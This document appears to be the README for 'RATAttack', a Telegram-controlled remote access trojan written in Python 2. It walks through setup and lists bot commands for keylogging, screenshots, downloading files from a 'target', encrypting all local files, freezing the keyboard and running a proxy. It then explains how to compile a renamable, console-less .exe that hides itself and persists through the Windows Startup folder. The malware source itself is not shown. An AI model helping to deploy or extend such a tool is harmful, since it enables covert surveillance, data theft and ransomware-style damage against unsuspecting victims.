## Installation & Usage:

- Clone this repository.
- Set up a new Telegram bot talking to the `BotFather`.
- Copy this token and replace it in the beginning of the script.
- Install the dependencies: `pip install -r requirements.txt`.
- Install pyHook `64-bit` or `32-bit` depending on your system.
    - For 64-bit- `pip install pyHook-1.5.1-cp27-cp27m-win_amd64.whl`.
    - For 32-bit- `pip install pyHook-1.5.1-cp27-cp27m-win32.whl`.
- To run the script: `python RATAttack.py`.
- Find your bot on telegram and send some command to the bot to test it.
- To restrict the bot so that it responds only to you, note down your `chat_id` from the console and replace it in the script and comment out the line `return True`. Don't worry, you'll know when you read the comments in the script.

- A folder named `RATAttack` will be created in your working directory containing `keylogs.txt` and any files you upload to the bot.
Commands:

When using the below commands; use `/` as a prefix. For example: `/pc_info`.

```
arp - display arp table
capture_pc - screenshot PC
cp - copy files
cd - change current directory
delete - delete a file/folder
download - download file from target
decode_all - decode ALL encoded local files
encode_all - encode ALL local files
freeze_keyboard - enable keyboard freeze
unfreeze_keyboard - disable keyboard freeze

ip_info - via ipinfo.io
keylogs - get keylogs
ls - list contents of current or specified directory
msg_box - display message box with text
mv - move files
pc_info - PC information
ping - makes sure target is up
play - plays a youtube video
proxy - opens a proxy server
pwd - show current directory
run - run a file
schedule - schedule a command to run at specific time
self_destruct - destroy all traces
tasklist - display services and processes running

```

You can copy the above to update your command list via `BotFather` so you don't have to type them manually.

## Compiling:

### How To Compile:
#### Either:
	Replace your path in compileAndRun.bat (running this will actually run the executable)
#### Or:
	Run `pyinstaller --onefile --noconsole C:\path\to\RATAttack.py`. You can also pass `--icon=<path\to\icon.ico>` to use any custom icon.
- Once it is compiled successfully, find the `.exe` file in `C:\Python27\Scripts\dist\`. You can change the name of the `.exe` to anything you wish.
- **BEWARE!** If you run the compiled `.exe`, the script will hide itself and infect your PC to run at startup. You can return to normal by using the `/self_destruct` option or manually removing `C:\Users\Username\AppData\Roaming\Portal` directory and `C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\portal.lnk` (although I recommend removing them manually for the time being).

### Modifying Settings:

- You can also modify the name of hidden `.exe` file and location & name of the folder where the hidden `.exe` will hide itself. To do this; modify `compiled_name` and `hide_folder` respectively.
- Assign your known chat ids to beginning of RATAttack.py

## Notes:

- Currently only Python2 is supported. Python3 support will be added soon!
